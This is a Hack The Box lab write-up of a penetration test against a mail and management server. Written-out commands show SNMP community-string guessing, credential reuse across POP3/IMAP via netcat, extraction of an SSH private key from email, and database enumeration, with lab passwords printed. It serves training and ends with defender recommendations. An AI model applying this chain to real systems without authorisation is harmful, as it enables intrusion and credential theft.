# HTB Lab Report - MX/Management Server Penetration Test

## Objective
Access credentials for the HTB user on an internal MX and management server that also functions as a backup server for internal domain accounts.

## Target Information
- **IP Address**: 10.129.202.20
- **Hostname**: NIXHARD  
- **Description**: MX server, management server, and backup server for internal accounts

## Methodology & Findings

### 1. Initial Reconnaissance

#### Port Scan - All Ports
```bash
nmap -p- 10.129.202.20
```
**Results:**
- 22/tcp  - SSH
- 110/tcp - POP3
- 143/tcp - IMAP
- 993/tcp - IMAPS
- 995/tcp - POP3S

#### Service Detection & Script Scan
```bash
nmap -p- 10.129.202.20 -O -sV -sC
```
**Key Findings:**
- OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
- Dovecot email services (POP3/IMAP)
- SSL certificates showing hostname "NIXHARD"
- AUTH=PLAIN supported on email services

#### Banner Grabbing
```bash
sudo nmap -p143,993,110,995,22 10.129.202.20 --script=banner
```
Confirmed service versions and capabilities.

### 2. Service Analysis

#### SSH Audit
```bash
ssh-audit 10.129.202.20
```
**Notable Finding:**
- CVE-2023-48795 (Terrapin attack) identified
- Multiple cryptographic weaknesses noted
- However, these did not provide direct exploitation paths

#### UDP Port Scan
```bash
nmap -sU --top-ports 20 10.129.202.20
```
**Critical Discovery:**
- **Port 161/udp - SNMP OPEN** ⚠️

### 3. SNMP Enumeration

#### Initial SNMP Tests
```bash
snmpwalk -c public -v1 10.129.202.20     # No response
snmpwalk -c private -v1 10.129.202.20    # No response
snmpwalk -c community -v1 10.129.202.20  # No response
```

#### Contextual SNMP Testing
Based on the lab description mentioning "backup server":
```bash
snmpwalk -c backup -v1 10.129.202.20
```

**BREAKTHROUGH:** This returned extensive system information including:

**Critical Finding:**
```
iso.3.6.1.2.1.25.1.7.1.2.1.3.6.66.65.67.75.85.80 = STRING: "tom NMds732Js2761"
```

**Additional Intelligence:**
- Recovery script: `/opt/tom-recovery.sh`
- Password change attempts for user "tom"
- System details: Linux NIXHARD 5.4.0-90-generic
- Contact: Admin <tech@inlanefreight.htb>

### 4. Email Service Access

#### Credentials Discovered
- **Username**: tom
- **Password**: NMds732Js2761

#### POP3 Access
```bash
nc 10.129.202.20 110
USER tom
PASS NMds732Js2761
```
**Result:** Successful authentication

#### IMAP Access  
```bash
nc 10.129.202.20 143
A01 LOGIN tom NMds732Js2761
```
**Result:** Successful authentication

#### Email Enumeration
Using POP3 commands:
```bash
STAT
LIST
RETR 1
```

**Critical Discovery:** Found SSH private key in tom's email

### 5. SSH Access via Private Key

#### Key Extraction & Setup
1. Retrieved complete SSH private key from email
2. Saved to file: `nano htb_key`
3. Set proper permissions: `chmod 600 htb_key`

#### SSH Connection
```bash
ssh -i htb_key tom@10.129.202.20
```
**Result:** Successful SSH access as tom

### 6. System Enumeration as tom

#### Recovery Script Analysis
```bash
cat /opt/tom-recovery.sh
```
**Contents:**
```bash
#!/bin/bash
echo $1:$2 | chpasswd
```
*Note: Simple password change script, but tom lacks sudo privileges*

#### File System Exploration
```bash
find /home -type f -readable 2>/dev/null
```

**Key Files Identified:**
- `/home/tom/.mysql_history`
- `/home/tom/.bash_history`
- `/home/tom/Maildir/cur/key:2,S`

#### Command History Analysis
```bash
cat ~/.bash_history
```
**Notable Commands:**
- Multiple MySQL connections
- Key file manipulation
- Database queries: `select * from users;`

```bash
cat ~/.mysql_history
```
**MySQL Activity:**
```sql
show databases;
select * from users;
use users;
select * from users;
```

### 7. Database Access & Final Credential Discovery

#### MySQL Connection
```bash
mysql -u tom -p
# Password: NMds732Js2761
```

#### Database Enumeration
```sql
show databases;
use users;
select * from users;
```

**FINAL BREAKTHROUGH:** HTB user credentials found in users table

## Attack Chain Summary

1. **Port scan** → Identified email and SSH services
2. **UDP scan** → Discovered SNMP service (port 161)
3. **SNMP enumeration** → Found tom's credentials using "backup" community string
4. **Email access** → Used tom's credentials to access POP3/IMAP
5. **SSH key extraction** → Retrieved tom's private key from email
6. **SSH access** → Used private key to access system as tom
7. **System enumeration** → Found MySQL history and connection details
8. **Database access** → Connected to MySQL with tom's credentials
9. **Credential discovery** → Located HTB user password in users database

## Key Learning Points

### Critical Success Factors
1. **SNMP Discovery**: The UDP scan was crucial - many pentesters focus only on TCP
2. **Contextual Thinking**: Testing "backup" as SNMP community string based on server description
3. **Following Breadcrumbs**: Each discovery led to the next step in the chain
4. **Persistence**: Not giving up when initial attempts (anonymous access, common passwords) failed

### Important Techniques
- **SNMP enumeration** with contextual community strings
- **Email service exploitation** for credential/key discovery
- **SSH private key extraction** from email systems
- **Database enumeration** following command history clues

### Security Implications
- SNMP misconfiguration exposed sensitive system information
- Email systems contained critical authentication materials
- Database contained plaintext user credentials
- Recovery scripts present but require privilege escalation

## Tools Used
- nmap (port scanning, service detection)
- ssh-audit (SSH security analysis)
- snmpwalk (SNMP enumeration)
- netcat (manual service interaction)
- openssl s_client (SSL/TLS service testing)
- mysql client (database access)

## Timeline
- **Reconnaissance**: ~15 minutes
- **SNMP Discovery**: ~10 minutes  
- **Email Access**: ~5 minutes
- **SSH Key Extraction**: ~10 minutes
- **System Access**: ~5 minutes
- **Database Discovery**: ~10 minutes
- **Total Time**: ~55 minutes

## Recommendations

### For Blue Team/Defenders
1. **Secure SNMP configuration** - Use strong community strings or disable if not needed
2. **Email security** - Implement DLP to prevent sensitive data in email
3. **Database security** - Hash passwords, implement least privilege
4. **Monitoring** - Log and alert on SNMP access attempts
5. **Key management** - Secure storage and transmission of SSH keys

### For Red Team/Pentesters
1. **Always scan UDP ports** - Critical services often missed
2. **Context-aware enumeration** - Use target information to guide testing
3. **Email systems are treasure troves** - Often contain keys, passwords, configurations
4. **Follow the breadcrumbs** - Command history and logs provide valuable intelligence
5. **Database enumeration** - User tables frequently contain credentials

---

*Lab completed successfully with HTB user credentials obtained through systematic enumeration and privilege escalation techniques.*
